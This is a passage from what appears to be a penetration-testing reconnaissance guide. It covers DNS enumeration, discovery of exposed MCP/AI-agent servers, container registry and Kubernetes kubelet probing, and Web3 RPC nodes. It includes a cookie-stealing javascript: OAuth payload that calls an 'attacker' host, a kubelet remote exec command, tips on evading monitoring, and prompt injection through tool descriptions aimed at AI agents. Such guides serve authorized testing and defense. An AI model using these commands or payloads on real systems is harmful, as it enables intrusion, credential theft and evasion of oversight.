  "https://cloudflare-dns.com/dns-query?name=secret.target.com&type=A"
curl -s "https://dns.google/resolve?name=secret.target.com&type=A"
```

### 16.4b DNS Recon MCP Server

An MCP server exposes DNS query primitives to Claude / AI agents so an agent can resolve, brute, and walk zones autonomously.

```json
{"tool":"dns_lookup","arguments":{"name":"_acme-challenge.target.com","type":"TXT","resolver":"1.1.1.1"}}
{"tool":"dns_brute","arguments":{"domain":"target.com","wordlist":"subdomains-top1million-20000"}}
```

### 16.4c CAA Record Pivoting

The CAA `issue` / `issuewild` fields name the issuing CAs an org trusts — a pivot to discover sibling domains sharing the same CA policy.

```bash
dig +short caa target.com
# target.com. 0 issue "letsencrypt.org"
# target.com. 0 issue "pki.goog"
# Pivot: search CT for certs issued by these CAs to *.target.com variants
```

### 16.4d Modern DNS Enumeration Stack

```bash
# 2026 stack: shuffledns (massdns wrapper) + dnsx (resolver/probe) + tlsx
shuffledns -d target.com -r resolvers.txt -w subdomains.txt -o shuf.txt
dnsx -d target.com -w shuf.txt -a -resp -o dnsx.txt
tlsx -u dnsx.txt -san -cn -o tlsx.txt      # cert SAN → more subdomains
```

---

### 16.5 MCP Server & AI Agent Infrastructure Discovery

MCP (Model Context Protocol) servers are the 2026 equivalent of exposed Redis in 2015 — abundant, often unauthenticated, and reachable from the internet.

### 16.5a Key Statistics (2026)

| Metric | Value |
|---|---|
| MCP servers with no auth | 41% |
| Production MCP servers discovered | 1,862 |
| OpenClaw instances exposed | 17,903 |

### 16.5b MCP Server Discovery via Shodan

```bash
shodan search "http.html:\"mcp\"" port:3000 --fields ip_str,port
shodan search "\"jsonrpc\" \"tools/list\"" --limit 200
# Banner signals: "MCP-Server", "modelcontextprotocol", "/sse", "/messages"
```

### 16.5c Unauthenticated tools/list

```bash
# Most MCP servers expose tools/list with no auth — full tool inventory leak
curl -s -X POST http://10.0.0.5:3000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
```

Example response:

```json
{"jsonrpc":"2.0","id":1,"result":{"tools":[
  {"name":"exec_shell","description":"Execute shell command","inputSchema":{}},
  {"name":"read_file","description":"Read arbitrary file","inputSchema":{}},
  {"name":"http_fetch","description":"SSRF primitive","inputSchema":{}}
]}}
```

### 16.5d MCP CVE Table

| CVE | Product | Impact | CVSS |
|---|---|---|---|
| CVE-2025-6514 | mcp-remote | RCE via OAuth callback | 9.6 |
| CVE-2025-64106 | Cursor | Prompt injection → code exec | 8.1 |
| CVE-2026-25253 | OpenClaw | Unauth tool invocation | 9.4 |
| CVE-2026-23744 | MCPJam | Path traversal in resource URI | 8.7 |

### 16.5e CVE-2025-6514 Detail — javascript: URL in OAuth Endpoint

The `mcp-remote` client accepts a `javascript:` URI in the OAuth authorization endpoint. When a victim clicks the deep-link callback, the OS hands the URI to a renderer that evaluates it as script → arbitrary JS execution in the MCP host context → RCE.

```text
oauth://authorize/?client_id=x&redirect_uri=javascript:fetch('http://attacker/'+document.cookie)
```

### 16.5f MCP Recon Scanner Checklist

```
□ Shodan/FOFA for MCP banners (port 3000, jsonrpc, "/sse", "/messages")
□ tools/list without auth → dump full tool inventory
□ resources/list → enumerate accessible file paths / URIs
□ Check OAuth callback handling for javascript:/data: URI (CVE-2025-6514)
□ Test prompt-injection via tool description fields (CVE-2025-64106)
□ Enumerate OpenClaw instances (CVE-2026-25253)
□ Probe resource URIs for path traversal (CVE-2026-23744)
□ Confirm scope before invoking any tool — these are live RCE primitives
□ Record server version + tool list as evidence for downstream exploitation
```

---

### 16.6 Container Registry & K8s Recon

### 16.6a Registry Enumeration

```bash
# Docker Hub org enumeration — list repos, find leaked tags
curl -s "https://hub.docker.com/v2/repositories/targetorg/?page_size=100" | jq '.results[].name'

# AWS ECR — list repos (anonymous if public)
aws ecr describe-repositories --region us-east-1 --registry-id 111122223333 --no-sign-request
aws ecr describe-images --repository-name target/app --registry-id 111122223333 --no-sign-request

# GCR / ACR
curl -s "https://gcr.io/v2/target-project/tags/list"
curl -s "https://target.azurecr.io/v2/_catalog"   # ACR, often anon-listable
```

### 16.6b Docker Registry API v2 — Unauthenticated Access

```bash
# Classic misconfig: registry v2 API exposed with no auth → list + pull any image
curl -s https://registry.target.com/v2/_catalog | jq
curl -s https://registry.target.com/v2/targetapp/tags/list | jq
# Pull manifest then layers — extract filesystem, hunt for .env / secrets
curl -s https://registry.target.com/v2/targetapp/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | jq
```

### 16.6c Kubernetes API Server Discovery

```bash
# Shodan queries for exposed K8s control planes
shodan search "http.title:\"Kubernetes Dashboard\"" port:30000,8001
shodan search "product:\"Kubernetes\"" port:6443,10250,2379 --fields ip_str,port

# Anonymous kubelet — often exposes pod lists, secrets, exec
curl -sk https://10.0.0.5:10250/pods
# If /pods returns, attempt run exec (subject to authorization scope):
curl -sk https://10.0.0.5:10250/run/namespace/pod/container -d "cmd=id"
```

### 16.6d Exposed RPC Nodes (Web3 / Chain Recon)

```bash
# Ethereum JSON-RPC exposed (often with debug/trace methods enabled)
shodan search "port:8545 product:\"Ethereum-JSON-RPC\"" --fields ip_str,port
curl -s -X POST http://10.0.0.5:8545 -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}'
# Dangerous: eth_blockNumber, trace_block, debug_traceTransaction leak tx flow

# Cosmos / Tendermint RPC
shodan search "port:26657" --fields ip_str
curl -s http://10.0.0.5:26657/status | jq
```

---

### 16.7 2026 Recon Quick Reference

| Goal | 2026 tool / technique | Yields |
|---|---|---|
| AI subdomain triage | PentestGPT / Subwiz / Nexus-REC | ranked, hypothesized targets |
| Continuous surface | Veritas RedTeam (1.4M/week) | drift-detected new assets |
| Multi-cloud IAM graph | Aurelian + Neo4j | privesc paths |
| Cloud takeover | Aurelian CloudFront-S3 / EB / CDK | dangling cloud resources |
| Fresh CT subdomains | Let's Encrypt 6-day + Static CT API | sub-days-new assets |
| CT bypass rate limits | direct PostgreSQL to crt.sh | bulk FQDN pull |
| Stealth DNS | DoH (Cloudflare/Google) | monitor-evading resolution |
| AI-agent DNS | DNS Recon MCP Server | autonomous enumeration |
| CT org mapping | crt.sh O= field query | shadow IT / acquisitions |
| MCP discovery | Shodan jsonrpc + tools/list | exposed AI-agent infra |
| MCP RCE | CVE-2025-6514 javascript: callback | remote code exec |
| Container secrets | Docker Registry v2 anon pull | leaked .env / keys |
| K8s control plane | Shodan K8s + anon kubelet /pods | pod lists, secrets |
| Web3 recon | eth JSON-RPC / Cosmos RPC | tx flow, node versions |

### 2026 Attack Surface Checklist

```
□ Run AI recon (PentestGPT/Subwiz/Nexus-REC) over the merged asset list; verify top 50
□ Deploy autonomous multi-agent stack: Recon → Exploitation → Reporting
□ Run Aurelian across all in-scope AWS/Azure/GCP accounts; graph IAM with Neo4j
□ Check CloudFront-S3, Elastic Beanstalk, CDK-bucket takeover modules
□ Covert identity-lookup (CloudTrail-bypassing) only with written authorization
□ Pull CT via direct PostgreSQL (bypass rate limits) for fresh subdomains
□ Map organizational sprawl via crt.sh O= field
□ Resolve over DoH where DNS monitoring evasion is in-scope
□ Stand up DNS Recon MCP Server for agent-driven enumeration
□ Pivot via CAA issuer records to find sibling domains
□ Shodan-sweep for MCP servers; dump tools/list without auth
□ Test MCP OAuth callbacks for javascript:/data: URI (CVE-2025-6514)
□ Enumerate OpenClaw + MCPJam instances for CVE-2026-25253 / -23744
□ Enumerate Docker Hub org, ECR/GCR/ACR for public image + tag leaks
□ Probe Docker Registry v2 API (_catalog) for unauth listing
□ Shodan K8s (6443/10250); pull /pods from anonymous kubelets
□ Map exposed Ethereum/Cosmos RPC nodes; check debug methods
□ Cross-filter all 2026 findings to written scope before any exploitation
```
